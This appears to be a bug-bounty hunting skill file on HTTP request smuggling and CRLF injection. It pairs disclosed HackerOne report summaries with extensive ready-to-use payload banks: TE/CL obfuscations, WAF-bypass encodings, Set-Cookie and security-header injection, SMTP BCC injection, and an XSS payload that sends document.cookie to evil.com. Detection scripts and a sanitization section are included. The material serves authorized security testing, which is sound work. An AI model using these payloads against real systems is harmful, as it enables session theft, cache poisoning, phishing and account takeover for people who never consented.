Transfer-Encoding: chunked / Transfer-Encoding: x   (TE.TE)        (#867577)
Content-Length: 4 + Transfer-Encoding: chunked      (CL.TE/TE.CL)

# Whitespace variants of the TE field name
Transfer-Encoding␠: chunked      (#1238709)
Transfer-Encoding\t:\tchunked    (#1063627)
[space]Transfer-Encoding: chunked (#753939)

# Delimiter corruption
Content[CR]Length: 42            (#922597)
Dummy: x[\n]Content-Length: 23   (#1524692)
bare CR as header-end            (#526880)

# TE value corruption
Transfer-Encoding: AAAchunkedBBB (#965267)
Transfer-Encoding: chunkedchunked (#1524555)
Transfer-Encoding: chunked\r\n , identity  (#1501679, #1665156)
chunk extension ; a=b / ;|...    (#1238099)
```

### Base64 / encoding layers (filter sees one thing, parser another)

Acronis reports note the payload can be sent "in the base64 decoded form" (#1063627, #1063493) — a
front-end filter inspecting the encoded string misses the raw CRLF / TE bytes the back-end decodes before
parsing. Test whether the parameter or path is decoded once, twice, or base64'd before framing: the number
of decode passes is itself the bug.

### Host / redirect-target bypasses

- Swap `Host` to a Collaborator domain on the smuggled request so the back-end's absolute redirect points
  at your listener and carries the victim's cookies (#737140, #726773, #1063627).
- Use the `/sf` path trick: changing Host forces a redirect to the attacker domain (#1063627 / #1063493).
  Handle HTTP→HTTPS port oddities with a `socat` relay as in #1063493.
- Use an absolute-form request line `GET http://attacker/ HTTP/1.1` to seed the redirect target directly.
- Case-vary header names (`Transfer-Encoding`, `Content-Length`) against case-sensitive front-end filters.

### CRLF injection encoding for reflected parameters

```
%0d%0a   -> CRLF           (#1038594, #191380)
%0d      -> bare CR (Apache/PHP sometimes accepts)   (#154306, #145128)
%23%0d   -> '#' + CR (ownCloud)                      (#154306)
%3f%0d%0a-> '?' + CRLF (Starbucks chrome PoC)        (#192667)
%0d%0a%0d%0a -> header block terminator + body injection  (#192667, #192749)
```

### Protocol / client option injection bypasses

- Inject CRLF through **programmatic options** that bypass URL/CLI sanitization: `CURLOPT_MAIL_FROM`,
  `CURLOPT_MAIL_RCPT`, `CURLOPT_RTSP_STREAM_URI`, `CURLOPT_REQUEST_TARGET`, `CURLOPT_HAPROXY_CLIENT_IP`,
  `CURLOPT_RTSP_*` (#3235428, #3481595, #4121689, #4121675, #3633534, #3963494). `Curl_setstropt()`
  validates only the 8 MB length cap, not control characters.
- Exploit **whitelist bypass** via CRLF in `url.parse().hostname`: `http://test1.com\n\rtest2.com` passes
  a naive allowlist while the modern `URL` API does not (#771596).
- **Digest auth `uri` parameter** is inserted raw while other parameters are escaped via
  `auth_digest_string_quoted()` (#3508799).
- **Set-Cookie injection** defeats double-submit-cookie CSRF and causes session fixation (#145128,
  #490997).

### Timing / pipelining tuning

- Use Turbo Intruder with `concurrentConnections=5`, `requestsPerConnection=1`, and
  `maxRetriesPerRequest=0` to catch the desync without poisoning unrelated users (#726773, #526880).
- Match chunk-size hex to the exact byte length of the smuggled second request; an off-by-one leaves the
  parser misaligned (#1063627, #713285).
- Tune the appended CRLFs on the trailing GET depending on whether you want a clean second request or
  deliberate misalignment (#713285).

---

## Gate 0 Validation

Before writing the report, confirm all four. A timing delta alone is not a finding.

1. **Is it real parser disagreement, or just a weird response?**
   - Reproduce a stable differential: 400 vs timeout vs 504, or a victim request receiving the smuggled
     response. A single odd status code is not proof.
   - Show the exact bytes (hex view of `0d 0a`, tabs, bare CR/LF) and the front/back banners that differ.
   - Re-run the sequence three times; intermittent results must be explained (keep-alive timing, load
     balancer rotation).

2. **Does the effect land on a DIFFERENT client/session?** (this is the pre-severity gate)
   - Trigger the smuggled effect from one session and observe it in a separate browser/session or via
     Collaborator. A timing stall in your own browser is only parser disagreement, not exploitable
     smuggling.
   - The victim response must contain something tied to the other client — their cookie, their request
     path, their token — not just your own injected marker.

3. **What does the victim actually lose?**
   - Cookie/token theft (#737140 d-cookie, #771666 X-Access-Token, #498052 password) → account takeover:
     Critical.
   - Cache poisoning / stored XSS at scale (#919175, #192749) → Critical.
   - Auth bypass to internal admin (#1002188, #1238099) → High/Critical.
   - Internal info disclosure (HMAC key, #753939) or pure DoS stalls (#713285) → Medium/High.
   - "I can desync the parsers" with no downstream effect → low/informational; keep hunting for the
     impact primitive.

4. **Can it be reproduced in 10 minutes from scratch?**
   - Payload byte counts correct, front-end behavior stable, OOB callback reliable.
   - For parser CVEs: minimal reproducer + affected version + patch-commit reference.
   - If exploitation depends on winning a race against live users, note the constraints and prefer a
     deterministic cache-poisoning or reflecting-gadget proof.

---

## Real Impact Examples

### Scenario A: Mass account takeover via CL.TE → arbitrary redirect (Slack pattern, #737140)

The researcher swept Slack's infrastructure with `smuggler`, found `slackb.com` vulnerable to CL.TE,
and poisoned its keep-alive socket. The smuggled request forced the next victim request into
`GET https://<URL> HTTP/1.1` on the backend. The backend replied with a `301` to `https://<URL>`
**including the victim's cookies, most importantly the `d` cookie**, and the URL pointed at the
attacker's Burp Collaborator — harvesting live session cookies at scale. Rated Critical (CVSS 9.3).

Zomato (#771666, CVSS 9.8) reproduced the primitive against `api.zomato.com` to steal `X-Access-Token`
in bulk; New Relic (#498052, $3,000) used the same family to capture login passwords.

### Scenario B: Web-cache poisoning from a single desync (Basecamp 2 / Starbucks pattern)

An authenticated Basecamp 2 user desynced front and back ends and poisoned the socket with a harmful
response for the next visitor (#919175). During a redirect probe the front-end was observed caching
content, so the poisoned response could be stored under a shared URL. Starbucks' `newscdn.starbucks.com`
CRLF payload (`%0d%0aContent-Length:35...<svg onload=...>`) was saved in cache after a Firefox request
and served to other browsers once `X-Cache: HIT` appeared (#192749). The result is stored XSS / mass
redirect affecting every visitor to a popular URL — the canonical smuggling + cache critical chain.

### Scenario C: Backend secret disclosure through a poisoned request (Fortmatic pattern, #753939)

By sending `[space]Transfer-Encoding: chunked` followed by a zero chunk, the researcher caused the
back-end to reflect the *next* request's details — the HMAC key, its encryption type, and additional
headers — into the response, then "cause the next valid request to error out returning valuable details."
This shows that even without cookie theft, a desync can turn a reflecting handler into a
secret-extraction oracle — the "collector gadget" primitive.

### Scenario D: Cross-protocol desync to internal AJP paths (mod_proxy_ajp, #1594627)

Apache HTTP Server ≤ 2.4.53 `mod_proxy_ajp` inconsistently interpreted requests forwarded to the AJP
back-end, enabling request smuggling with information disclosure and RCE impact ($2,400, CVE class).
Because the smuggled request is opaque to the front-end WAF, it reaches internal AJP admin/status paths
that lack external auth controls — a high-value variant of the auth-bypass chain.

---

## Disclosed Report Citations

All IDs below are real and drawn from the study pack or the TOPREQUESTSMUGGLING source list. Bounty is
shown where publicly disclosed.

1. **Slack — Mass account takeovers using HTTP Request Smuggling on slackb.com to steal session cookies** ([H1 #737140](https://hackerone.com/reports/737140)) — CL.TE → arbitrary redirect → d-cookie theft; 2019, Critical CVSS 9.3.
2. **Eternal (Zomato) — Stealing Zomato X-Access-Token in Bulk using HTTP Request Smuggling on api.zomato.com** ([H1 #771666](https://hackerone.com/reports/771666)) — CL.TE + redirect/cookie theft; 2020, Critical CVSS 9.8.
3. **LY Corporation — Request smuggling on admin-official.line.me could lead to account takeover** ([H1 #740037](https://hackerone.com/reports/740037)) — CL.TE → ATO; 563 upvotes, public $0.
4. **New Relic — Password theft login.newrelic.com via Request Smuggling** ([H1 #498052](https://hackerone.com/reports/498052)) — CL.TE login credential capture; $3,000.
5. **Helium — HTTP request Smuggling** ([H1 #867952](https://hackerone.com/reports/867952)) — CL.TE on `POST /api/sessions`; 2020, High.
6. **Basecamp — HTTP Request Smuggling via HTTP/2** ([H1 #1211724](https://hackerone.com/reports/1211724)) — H2.CL/H2.TE downgrade; $7,500.
7. **Mail.ru — HTTP request smuggling (?) canpol.deti.mail.ru** ([H1 #957881](https://hackerone.com/reports/957881)) — CL.TE/TE.CL desync; $5,000.
8. **GSA Bounty — HTTP Request Smuggling on labs.data.gov** ([H1 #726773](https://hackerone.com/reports/726773)) — TE/CL disagreement via Turbo Intruder; 2019, High CVSS 7.7, $750.
9. **Visma Public — HTTP Request Smuggling at app.workbox.dk** ([H1 #919988](https://hackerone.com/reports/919988)) — CL.TE desync; $500.
10. **Node.js — HTTP Request Smuggling due to CR-to-Hyphen conversion** ([H1 #922597](https://hackerone.com/reports/922597)) — CR→hyphen parser divergence; 2020, High CVSS 8.5.
11. **Node.js — HTTP request smuggling using malformed Transfer-Encoding header** ([H1 #735748](https://hackerone.com/reports/735748)) — malformed TE parsing; 2019, Critical CVSS 9.0.
12. **Cloudflare Public Bug Bounty — HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in concat()** ([H1 #1478633](https://hackerone.com/reports/1478633)) — hex-escape header injection; $6,000.
13. **Node.js — HTTP Request Smuggling due to accepting space before colon** ([H1 #1238709](https://hackerone.com/reports/1238709)) — `llhttp` SP-before-colon divergence; 2021, Medium, $250.
14. **U.S. Dept Of Defense — HTTP Request Smuggling** ([H1 #1120982](https://hackerone.com/reports/1120982)) — CL/TE desync, cache/auth impact; 2021, High.
15. **Node.js — Potential HTTP Request Smuggling in nodejs** ([H1 #1002188](https://hackerone.com/reports/1002188)) — TE.TE duplicate TE bypassing HAProxy `/flag`; 2020, Low, $250.
16. **X / xAI — http request smuggling in pscp.tv and periscope.tv** ([H1 #713285](https://hackerone.com/reports/713285)) — CL.TE + 30/60 s delay DoS + victim poisoning; 2019, High, $560.
17. **Acronis — HTTP Request Smuggling on consumer.acronis.com** ([H1 #1063627](https://hackerone.com/reports/1063627)) — CL.TE + tab TE + Host-swap redirect; 2020, Low.
18. **Stripo Inc — HTTP Request Smuggling on my.stripo.email** ([H1 #777651](https://hackerone.com/reports/777651)) — CL.TE via HTTP Request Smuggler; 2020, High.
19. **Brave Software — HTTP Request Smuggling** ([H1 #866382](https://hackerone.com/reports/866382)) — CL.TE on `POST /publishers/registrations.json`; 2020, High.
20. **Basecamp — HTTP request smuggling on Basecamp 2 allows web cache poisoning** ([H1 #919175](https://hackerone.com/reports/919175)) — CL.TE → cache poisoning; 2020, Critical.
21. **Basecamp — Unauthenticated request smuggling on launchpad.37signals.com** ([H1 #867577](https://hackerone.com/reports/867577)) — TE.TE (valid+invalid TE) → redirect; 2020, Critical.
22. **U.S. Dept Of Defense — Request smuggling on internal stage host** ([H1 #526880](https://hackerone.com/reports/526880)) — bare-CR header delimiting desync → user redirects; 2019, High.
23. **Internet Bug Bounty — Apache HTTP Server mod_proxy_ajp: Possible request smuggling** ([H1 #1594627](https://hackerone.com/reports/1594627)) — HTTP→AJP cross-protocol desync; 2022, Medium CVSS 5.3, $2,400.
24. **Node.js — HTTP Request Smuggling Due To Improper Delimiting of Header Fields** ([H1 #1524692](https://hackerone.com/reports/1524692)) — LF-only header delimiting in `llhttp`; 2022, Medium CVSS 6.5.
25. **Node.js — HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding** ([H1 #1501679](https://hackerone.com/reports/1501679)) — obs-fold TE parsing; 2022, Medium CVSS 6.5.
26. **Node.js — HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding** ([H1 #1524555](https://hackerone.com/reports/1524555)) — `chunkedchunked` re-match; 2022, Medium CVSS 6.5.
27. **Node.js — HTTP Request Smuggling due to ignoring chunk extensions** ([H1 #1238099](https://hackerone.com/reports/1238099)) — chunk-extension parser divergence with ATS; 2021, Medium, $250.
28. **curl — HTTP Request Smuggling and SSRF via CRLF Injection in Curl_add_custom_headers** ([H1 #3484431](https://hackerone.com/reports/3484431)) — raw CRLF in custom headers; 2026, High.
29. **GitLab — CRLF injection & SSRF in git:// protocol lead to arbitrary code execution** ([H1 #441090](https://hackerone.com/reports/441090)) — CRLF→Redis SSRF→RCE; 2018, High CVSS 8.5.
30. **Node.js — CRLF Injection in legacy url API (url.parse().hostname)** ([H1 #771596](https://hackerone.com/reports/771596)) — CRLF allowlist bypass; 2020, Medium.

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled response
  becomes the cached page for every visitor to a popular URL (#919175, #192749, #510152).
- **`hunt-auth-bypass`** — Smuggle internal-only routes (`/admin`, `/flag`, `/server-status`) past the
  front-end ACL/WAF (#1002188, #1238099, AJP #1594627).
- **`hunt-ato` / `hunt-session-attack`** — Captured `Cookie`/`d`/`X-Access-Token` and injected
  `Set-Cookie` convert a desync into account takeover or session fixation (#737140, #771666, #498052,
  #145128).
- **`hunt-xss`** — A smuggled reflected payload renders in the next victim's response with no visible
  URL parameter; cache poisoning makes it stored XSS.
- **`hunt-ssrf`** — CRLF injection into HTTP-client options (libcurl #3484431, GitLab `git://` #441090)
  can both smuggle a request and bypass SSRF allowlists (#771596).
- **`hunt-rce`** — Cross-protocol desync to AJP admin paths (#1594627) or CRLF→Redis SSRF→RCE
  (#441090) are direct RCE chains.
- **`security-arsenal`** — Load the smuggling payload bank (CL.TE/TE.CL/TE.TE obfuscations, H2.CL
  downgrade, `llhttp` mangle set, h2csmuggler one-liners, Burp HTTP Request Smuggler config) and the
  time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Apply the Pre-Severity Gate: the smuggled effect MUST land on a request from
  a different client/session; a timing delta in your own browser alone is parser disagreement, not
  exploitable smuggling.


---

## Merged Source Knowledge

This section consolidates **91 unique knowledge blocks** from 2 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (94 unique sections). No source section appears in more than one hunt skill.


### From `normal-skills/crlf-injection.md`

name: crlf-injection
description: Comprehensive CRLF Injection (HTTP Response Splitting & Header Injection) testing methodology covering response splitting, header injection, cache poisoning, XSS via headers, SMTP injection, filter evasion with unicode variants, double-encoding, and optimized detection techniques for modern web stacks.
version: 1.0.0
---

## Overview

CRLF Injection (Carriage Return Line Feed Injection), also known as HTTP Response Splitting and HTTP Header Injection, is an attack technique that exploits applications failing to sanitize user input containing newline characters. By injecting `\r\n` (CRLF) sequences into HTTP headers, attackers can manipulate the HTTP response structure, inject arbitrary headers, split responses, poison caches, escalate to XSS, and in specific contexts achieve SMTP command injection.

**Core Mechanics:**
- **CRLF Sequence:** `\r\n` (0x0D 0x0A) terminates HTTP headers per RFC 7230
- **Response Splitting:** Injecting `\r\n\r\n` terminates the current response, allowing attacker-controlled body injection
- **Header Injection:** Appending `\r\n` followed by `Header-Name: value` injects arbitrary headers
- **Protocol Context:** HTTP/1.1, HTTP/2 (via downgrade), SMTP, email headers, log files

**Impact Severity Matrix:**
| Vector | Impact | Severity |
|--------|--------|----------|
| Response Splitting | XSS, cache poisoning, defacement | High |
| Set-Cookie Injection | Session fixation, account takeover | Critical |
| Location Header Injection | Open redirect, phishing | Medium-High |
| Cache-Control Poisoning | Persistent XSS, mass defacement | Critical |
| SMTP Header Injection | Email spoofing, phishing | High |

---

### 1.1 Initial Reconnaissance

Identify injection points where user input is reflected in HTTP response headers:

**Primary Injection Points:**
- URL parameters (`?redirect=`, `?next=`, `?return=`, `?url=`)
- Path segments (reflected in `Location`, `Content-Location`)
- Host headers (reflected in redirects, password reset links)
- Cookie values (reflected in Set-Cookie responses)
- Form inputs (reflected in custom headers like `X-User-Input`)
- Referer/Origin headers (logged or reflected)
- File upload filenames (reflected in `Content-Disposition`)
- API response headers (CORS, rate limiting headers)

**Header Reflection Analysis:**
```bash

# Identify headers reflecting user input
curl -I "https://target.com/redirect?url=testvalue" | grep -i "testvalue"
curl -I "https://target.com/" -H "X-Custom: injecttest" | grep -i "injecttest"
```

### 1.2 Basic Detection Payloads

Test for raw CRLF reflection in response headers:

```
%0d%0a
%0d%0aTestHeader: injected
%0aTestHeader: injected
%0dTestHeader: injected
%0d%0a%0d%0a<html><body>XSS</body></html>
```

**Verification Methodology:**
1. Send payload in each identified injection point
2. Inspect raw HTTP response (not just browser rendering)
3. Look for newly injected headers in the response
4. Check for response body content appearing prematurely

**Burp Suite Detection Regex:**
```regex
(?i)(?:Set-Cookie|Location|X-Frame-Options|Content-Type|Cache-Control|Last-Modified|X-Custom-Header):\s*[^\r\n]*[\r\n]
```

---

### 2.1 Core Payload Arsenal

**Basic CRLF Injection:**
```
%0d%0aSet-Cookie: session=hacked; Path=/
%0d%0aLocation: https://evil.com
%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<html>Hacked</html>
```

**Response Splitting (Full):**
```
%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 50%0d%0a%0d%0a<html><script>alert(1)</script></html>
```

**Header Continuation (HTTP/1.1 Folded Headers):**
```
%0d%0a%20Set-Cookie: admin=true
%0d%0a%09X-Injected: true
```

### 2.2 Encoding Variants Matrix

| Encoding | CRLF Representation | Use Case |
|----------|---------------------|----------|
| URL Encoding | `%0d%0a` | Standard web apps |
| Double URL Encoding | `%250d%250a` | WAFs, secondary decoding |
| Triple URL Encoding | `%25250d%25250a` | Deep nested decoding |
| Unicode UTF-8 | `%e5%98%8a%e5%98%8d` | Unicode normalization bypass |
| Unicode Fullwidth | `%ef%bc%8d%ef%bc%8d` | Fullwidth character bypass |
| HTML Entity | `&#13;&#10;` | HTML context injection |
| Hex Encoding | `0x0d0a` | Binary protocols |
| Mixed Case | `%0D%0A`, `%0D%0a` | Case-sensitive filters |
| Overlong UTF-8 | `%c0%8d%c0%8a` | UTF-8 security checks bypass |
| Bare LF | `%0a` | Unix-only systems |
| Bare CR | `%0d` | Legacy Mac systems |

### 2.3 Advanced Unicode & Alternative Newlines

**Unicode Line Terminators (Bypass strict `\r\n` filters):**
```
%u000a          # Unicode newline
%u000d          # Unicode carriage return
%u000d%u000a    # Unicode CRLF
\u000a          # JSON unicode escape
\u000d          # JSON unicode escape
\u000d\u000a    # JSON unicode CRLF
%C0%8A          # Overlong UTF-8 LF
%C0%8D          # Overlong UTF-8 CR
%E5%98%8A       # Unicode U+560A (alternative newline)
%E5%98%8D       # Unicode U+560D (alternative carriage return)
```

**HTML5 Entity Encoding:**
```
&#13;&#10;              # Decimal entities
&#x0d;&#x0a;            # Hex entities
&#013;&#010;            # Zero-padded decimal
&#xd;&#xa;              # Short hex
```

**JavaScript Unicode Escapes:**
```
\u000d\u000a
\x0d\x0a
```

### 2.4 Context-Specific Payloads

**Cookie Injection Context:**
```
%0d%0aSet-Cookie: admin=true; HttpOnly; Secure; Path=/
%0d%0aSet-Cookie: sessionid=STOLEN; Max-Age=999999
```

**Location Header Context:**
```
%0d%0aLocation: https://phishing-site.com/login
%0d%0aLocation: javascript:alert(1)
```

**Content-Type Injection (XSS Vector):**
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.cookie)</script>
```

**Cache-Control Poisoning:**
```
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aExpires: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000
```

---

### 3.1 HTTP Response Splitting

**Objective:** Split the HTTP response to inject attacker-controlled body content.

**Prerequisites:**
- User input reflected in response headers (Location, Set-Cookie, etc.)
- No output encoding of `\r\n` sequences
- Proxy/server does not normalize or strip newlines

**Exploitation Chain:**
```
Original Request:
GET /redirect?url=value HTTP/1.1

Injected Request:
GET /redirect?url=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Hacked</html> HTTP/1.1

Result:
HTTP/1.1 302 Found
Location: 
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 35

<html>Hacked</html>HTTP/1.1 200 OK
...
```

**Modern Mitigation Bypass:**
HTTP/2 to HTTP/1.1 downgrade vulnerabilities in proxies:
```
:authority: target.com
:path: /redirect?url=%0d%0aSet-Cookie:%20hacked=1
```
HTTP/2 pseudo-headers may be translated to HTTP/1.1 headers without proper sanitization.

### 3.2 Header Injection Attacks

**Set-Cookie Injection (Session Fixation/Account Takeover):**
```
%0d%0aSet-Cookie: session=ATTACKER_CONTROLLED; Path=/; HttpOnly; Secure
%0d%0aSet-Cookie: admin=1; Path=/admin
```

**Security Header Stripping/Override:**
```
%0d%0aX-Frame-Options: ALLOWALL
%0d%0aContent-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
%0d%0aX-Content-Type-Options: nosniff
%0d%0aX-XSS-Protection: 0
```

**CORS Header Injection:**
```
%0d%0aAccess-Control-Allow-Origin: https://evil.com
%0d%0aAccess-Control-Allow-Credentials: true
```

### 3.3 Cache Poisoning via Header Injection

**Target Headers for Cache Poisoning:**
```
%0d%0aLast-Modified: Mon, 01 Jan 2099 00:00:00 GMT
%0d%0aCache-Control: public, max-age=31536000, immutable
%0d%0aExpires: Mon, 01 Jan 2099 00:00:00 GMT
```

**Exploitation Strategy:**
1. Inject cache-busting headers into a cached resource
2. Combine with response splitting to serve malicious content from cache
3. Poison shared caches (CDNs) for mass impact

**CDN-Specific Vectors:**
```
%0d%0aCF-Cache-Status: HIT
%0d%0aX-Cache: HIT
%0d%0aAge: 0
```

### 3.4 XSS via Header Injection

**Content-Type Manipulation:**
```
%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>fetch('https://evil.com/log?c='+document.cookie)</script>
```

**X-Content-Type-Options Bypass:**
```
%0d%0aX-Content-Type-Options: nosniff%0d%0aContent-Type: text/html
```

**CSP Bypass via Header Injection:**
```
%0d%0aContent-Security-Policy: default-src * 'unsafe-inline'
```

### 3.5 Email/SMTP Header Injection

**Context:** Applications sending email where user input becomes part of email headers (contact forms, registration, password reset).

**SMTP Command Injection:**
```
%0d%0aBCC: attacker@evil.com
%0d%0aCC: victim1@company.com,victim2@company.com
%0d%0aSubject: Hacked
%0d%0aContent-Type: text/html
%0d%0a%0d%0a<h1>Phishing Content</h1>
```

**Email Header Injection Payloads:**
```
From: victim@company.com%0d%0aBCC: attacker@evil.com
Subject: Password Reset%0d%0a%0d%0aNew password: hacked123
To: admin@company.com%0d%0aSubject: Urgent%0d%0a%0d%0aMalicious body
```

**MIME Boundary Injection:**
```
%0d%0aContent-Type: multipart/mixed; boundary=evil%0d%0a%0d%0a--evil%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>%0d%0a--evil--
```

---

### 4.1 Encoding Bypasses

**Double URL Encoding:**
```
%250d%250a
%25250d%25250a
```

**Mixed Encoding:**
```
%0d%250a
%250d%0a
```

**Unicode Normalization Bypass:**
```
%e5%98%8a%e5%98%8d    # Normalizes to \r\n in some contexts
%ef%bc%8d%ef%bc%8d    # Fullwidth hyphen (U+FF0D) - not newline but test
```

### 4.2 Alternative Newline Sequences

| Sequence | Bytes | Description |
|----------|-------|-------------|
| `\r\n` | `0D 0A` | Standard CRLF |
| `\n` | `0A` | Unix LF |
| `\r` | `0D` | Mac CR |
| `\u2028` | `E2 80 A8` | Unicode Line Separator |
| `\u2029` | `E2 80 A9` | Unicode Paragraph Separator |
| `\u0085` | `C2 85` | Unicode Next Line (NEL) |
| `\x0b` | `0B` | Vertical Tab |
| `\x0c` | `0C` | Form Feed |

**JSON Context:**
```json
{"redirect": "value\u000d\u000aSet-Cookie: hacked=1"}
```

### 4.3 HTTP/2 Specific Bypasses

**HTTP/2 Header Injection (H2.TE / H2.CL):**
```
:authority: target.com
:scheme: https
:method: GET
:path: /?url=%0d%0aSet-Cookie:%20hacked=1
```

**HTTP/2 Pseudo-Header Contamination:**
Inject into `:authority` or `:path` which may be concatenated into HTTP/1.1 headers during downgrade.

### 4.4 WAF Bypass Techniques

**Case Variation:**
```
%0D%0A
%0d%0A
%0D%0a
```

**Tab Character Substitution:**
```
%0d%0a%09Header: value    # Tab after CRLF for header continuation
%0d%0a%20Header: value    # Space after CRLF
```

**Comment Injection (Legacy):**
```
%0d%0aSet-Cookie: value; expires=Mon, 01-Jan-2099 %0d%0a%20 00:00:00 GMT
```

**Chunked Transfer Encoding Abuse:**
```
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X-Injected: true\r\n
\r\n
```

---

### 5.1 Redirect Parameters

**Test Parameters:**
```
?next=
?return=
?redirect=
?url=
?return_to=
?redir=
?continue=
?dest=
?destination=
?go=
```

**Test Sequence:**
1. `%0d%0aTestHeader: injected` - Basic detection
2. `%0d%0aSet-Cookie: test=1` - Cookie injection
3. `%0d%0aLocation: https://evil.com` - Open redirect via header
4. `%0d%0a%0d%0a<script>alert(1)</script>` - Response splitting

### 5.2 Host Header Injection

**Test Scenarios:**
- Password reset functionality
- Email verification links
- 2FA code delivery
- Account invitation links

**Payloads:**
```
Host: target.com%0d%0aX-Forwarded-Host: evil.com
Host: target.com%0d%0aX-HTTP-Host-Override: evil.com
```

### 5.3 File Upload Filename Injection

**Content-Disposition Header Injection:**
```
filename="file.pdf%0d%0aContent-Type: text/html"
filename="file.pdf%0d%0a%0d%0a<script>alert(1)</script>"
```

### 5.4 API & JSON Contexts

**JSON Value Injection:**
```json
{
  "redirect_url": "https://target.com%0d%0aSet-Cookie: admin=1",
  "callback": "https://target.com%0d%0aLocation: https://evil.com"
}
```

**XML Injection:**
```xml
<redirect>https://target.com&#13;&#10;Set-Cookie: hacked=1</redirect>
```

---

### 6.1 Burp Suite Extensions & Configurations

**Match and Replace Rules:**
```
Match: ^(.*)$
Replace: $1%0d%0aX-CRLF-Test: 1
```

**Intruder Payload Positions:**
```
GET /redirect?url=§payload§ HTTP/1.1
```

**Payload List for Intruder:**
```
%0d%0a
%0a
%0d
%0d%0aSet-Cookie: test=1
%0d%0aLocation: https://evil.com
%250d%250a
%e5%98%8a%e5%98%8d
```

### 6.2 Custom Detection Scripts

**Python Detection Script:**
```python
import requests
import urllib.parse

TARGET = "https://target.com/redirect"
PARAM = "url"
PAYLOADS = [
    "%0d%0aX-CRLF-Test: 1",
    "%0aX-CRLF-Test: 1",
    "%0dX-CRLF-Test: 1",
    "%250d%250aX-CRLF-Test: 1",
    "%e5%98%8a%e5%98%8dX-CRLF-Test: 1"
]

def test_crlf(url, param, payload):
    test_url = f"{url}?{param}={payload}"
    try:
        r = requests.get(test_url, allow_redirects=False, timeout=10)
        headers = str(r.headers)
        if "X-CRLF-Test" in headers:
            print(f"[VULNERABLE] {payload}")
            print(f"  URL: {test_url}")
            return True
    except Exception as e:
        print(f"[ERROR] {e}")
    return False

for p in PAYLOADS:
    test_crlf(TARGET, PARAM, p)
```

### 6.3 Nuclei Templates

```yaml
id: crlf-injection

info:
  name: CRLF Injection Detection
  author: custom
  severity: medium
  description: Detects CRLF injection vulnerabilities

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=%0d%0aSet-Cookie:crlf=test"
    
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)Set-Cookie: crlf=test"
```

---

### 7.1 HTTP Request Smuggling + CRLF Injection

**H2.TE Smuggling with CRLF:**
```
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /redirect?url=%0d%0aHTTP/1.1%20200%20OK HTTP/1.1
Host: target.com
```

### 7.2 SSRF to CRLF Injection Chains

**Gopher Protocol with CRLF:**
```
gopher://target.com:80/_GET%20/redirect?url=%0d%0aSet-Cookie:%20hacked=1%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
```

### 7.3 Log Injection to CRLF

**Log File Poisoning:**
```
User-Agent: Mozilla/5.0%0d%0a<script>alert(1)</script>
X-Forwarded-For: 127.0.0.1%0d%0aAdmin: true
```

### 7.4 PDF/Excel Header Injection

**Content-Disposition in File Downloads:**
```
?file=document.pdf%0d%0aContent-Type: text/html
```

---

### 8.1 Confirmation Checklist

- [ ] Raw response contains injected headers
- [ ] Browser/network tool confirms header presence
- [ ] Response splitting creates valid secondary response
- [ ] Cookie injection persists across requests
- [ ] Cache poisoning affects subsequent requests
- [ ] XSS payload executes in browser context

### 8.2 Safe Proof of Concept Payloads

**Non-Destructive Detection:**
```
%0d%0aX-CRLF-Detection: {{random_string}}
%0d%0aX-Bug-Bounty: {{researcher_identifier}}
```

**Cookie-Based Confirmation:**
```
%0d%0aSet-Cookie: crlf_detection={{random_string}}; Path=/
```

### 8.3 Browser Verification

```javascript
// Verify injected cookie
document.cookie.includes('crlf_detection=')

// Verify injected header via fetch
fetch('/').then(r => console.log(r.headers.get('X-CRLF-Detection')))
```

---

### 9.1 Common Defenses

| Defense | Bypass Technique |
|---------|------------------|
| Strip `\r\n` | Use alternative newlines (`\u2028`, `\u2029`) |
| URL decode once | Double encoding (`%250d%250a`) |
| Input validation | HTTP/2 smuggling, header continuation |
| Web Application Firewall | Unicode normalization, case variation |
| Header size limits | Split across multiple parameters |

### 9.2 Secure Coding Patterns

**Proper Sanitization (Python/Flask):**
```python
from werkzeug.http import dump_header
import re

def sanitize_header_value(value):
    # Remove all newline characters
    return re.sub(r'[\r\n]', '', value)
```

**Proper Sanitization (Node.js/Express):**
```javascript
function sanitizeHeader(value) {
    return value.replace(/[\r\n]/g, '');
}
```

---

### Vulnerability Report Structure

**Title:** CRLF Injection (HTTP Response Splitting) via [Parameter] in [Endpoint]

**Severity:** High / Critical (context-dependent)

**Description:**
The application fails to sanitize user-supplied input containing carriage return (`\r`, `%0d`) and line feed (`\n`, `%0a`) characters in the [parameter] parameter of the [endpoint] endpoint. This allows injection of arbitrary HTTP headers and response splitting.

**Affected Endpoint:**
```
[METHOD] [FULL_URL]
```

**Proof of Concept:**
```
[EXACT_REQUEST]
```

**Impact:**
- HTTP Response Splitting leading to XSS
- Session fixation via Set-Cookie injection
- Cache poisoning attacks
- Security header bypass

**Remediation:**
1. Strip `\r\n` from all user input reflected in headers
2. Use framework-provided redirect functions that validate URLs
3. Implement strict input validation using allowlists
4. Deploy Web Application Firewall with CRLF detection rules

**References:**
- CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')
